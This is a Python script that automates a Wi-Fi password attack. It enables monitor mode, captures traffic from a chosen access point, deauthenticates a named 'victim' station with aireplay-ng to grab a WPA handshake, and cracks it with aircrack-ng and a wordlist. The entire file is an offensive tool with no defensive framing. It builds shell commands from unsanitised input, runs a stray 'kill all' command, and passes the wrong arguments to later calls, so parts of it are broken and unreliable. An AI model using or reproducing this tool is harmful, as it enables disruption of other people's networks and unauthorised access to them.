import os
import time

enter = "\n"

print("""________________________________________________________________________________________________________________________

                            * The Tool Created By Idan - TraiLeR *
                            
________________________________________________________________________________________________________________________""")

print(f"Set up the adapter{enter}")

adapter = input("Enter your adapter's name > ")

print(f"{enter}Checking if there are any problematic PPID........................... (Press Enter){enter}")

os.system("kill all")
print(f"All PPID have been deleted.{enter}")

print(f"Let's Enable Monitor Mode!{enter}")
os.system("ifconfig {0} down && iwconfig {0} mode monitor && ifconfig {0} up".format(adapter))
print("Mode Monitor in {0} has changed successfully!{1}".format(adapter, enter))

print("Press CTRL + C When you Finish the SCAN! *IMPORTANT* ")

time.sleep(5)

os.system("airodump-ng {0}".format(adapter))

bssid_name = input("Enter BSSID Name > ")
channel = input(f"{enter}Enter channel > ")
bssid = input(f"{enter}Enter BSSID > ")

os.system("gnome-terminal -- airodump-ng -c {0} --bssid {1} {2} -w /root/Desktop/{2}".format(channel, bssid, bssid_name))
time.sleep(5)

print(f"PCAP file saved in /root/Desktop{enter}")

packets = int(input("Enter Number of Attacks (10-100) > "))
victim = input("Enter Victim's Station > ")

os.system("aireplay-ng --deauth {0} -a {1} -c {2} {3}".format(packets, bssid, victim, bssid_name))

time.sleep(5)

pcap_file_path = input("Enter PCAP File Path > ")
wordlist_path = input(f"{enter}Enter Wordlist Path > ")

os.system("aircrack-ng -w {0} {1}".format(wordlist_path, pcap_file_path))

print("Done")
